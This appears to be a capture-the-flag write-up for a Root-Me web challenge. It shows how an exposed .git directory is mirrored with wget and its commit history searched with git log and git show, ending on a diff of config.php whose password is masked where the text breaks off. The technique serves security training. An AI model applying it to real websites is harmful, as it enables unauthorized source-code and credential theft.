We check for the presence of the .git folder in the site root... Bingo!

We download the files with wget
$ wget --mirror http://challenge01.root-me.org/web-serveur/ch61/.git/

In the directory containing the .git folder, we can begin to retrieve information on the source code:

$ git checkout
D config.php
M css/style.css
M image/background.jpg
M image/logo.png
D index.php

We look at the old commits:

$ git log
commit c0b4661c888bd1ca0f12a3c080e4d2597382277b (HEAD -> master)
Author: John <john@bs-corp.com>
Date: Fri Sep 27 20:10:05 2019 +0200

   blue team want sha256!!!!!!!!!

commit 550880c40814a9d0c39ad3485f7620b1dbce0de8
Author: John <john@bs-corp.com>
Date: Mon Sep 23 15:10:07 2019 +0200

   renamed app name

commit a8673b295eca6a4fa820706d5f809f1a8b49fcba
Author: John <john@bs-corp.com>
Date: Sun Sep 22 12:38:32 2019 +0200

   changed password

commit 1572c85d624a10be0aa7b995289359cc4c0d53da
Author: John <john@bs-corp.com>
Date: Thu Sep 12 11:10:06 2019 +0200
We realize that one of the commits is interesting :

$ git show a8673b295eca6a4fa820706d5f809f1a8b49fcba
commit a8673b295eca6a4fa820706d5f809f1a8b49fcba
Author: John <john@bs-corp.com>
Date: Sun Sep 22 12:38:32 2019 +0200

   changed password

diff --git a/config.php b/config.php
index 9a7f16d..e11aad2 100644
--- a/config.php
+++ b/config.php
@@ -1,3 +1,3 @@
<?php
       $username = "admin";
- $password = "admin";
+ $password = "s*****